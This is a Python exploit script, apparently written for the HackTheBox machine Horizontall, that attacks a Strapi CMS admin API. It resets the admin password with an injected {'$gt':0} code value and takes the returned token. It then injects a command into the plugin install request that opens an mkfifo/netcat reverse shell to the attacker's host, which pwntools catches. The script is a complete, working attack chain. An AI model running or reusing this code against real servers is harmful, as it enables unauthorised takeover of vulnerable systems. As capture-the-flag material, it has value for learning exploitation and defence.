#!/usr/bin/python3
import requests, json
from pwn import *

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <lhost>\n")
    exit(1)

with open("/etc/hosts", "a") as file:
    file.write("10.10.11.105 api-prod.horizontall.htb")

data = {"code" : {"$gt":0}, "password" : "SuperStrongPassword1", "passwordConfirmation" : "SuperStrongPassword1"}
output = requests.post(f"http://api-prod.horizontall.htb/admin/auth/reset-password", json=data).text
json = json.loads(output)
jwt = json["jwt"]

def cmd():
    target = "http://api-prod.horizontall.htb/admin/plugins/install"
    headers = {"Host": "api-prod.horizontall.htb", "Authorization": f"Bearer {jwt}", "Content-Type": "application/json"}
    data = '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s 443 >/tmp/f)", "port":"80"}' % sys.argv[1]
    requests.post(target, headers=headers, data=data, verify=False)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=25).wait_for_connection()
shell.interactive()
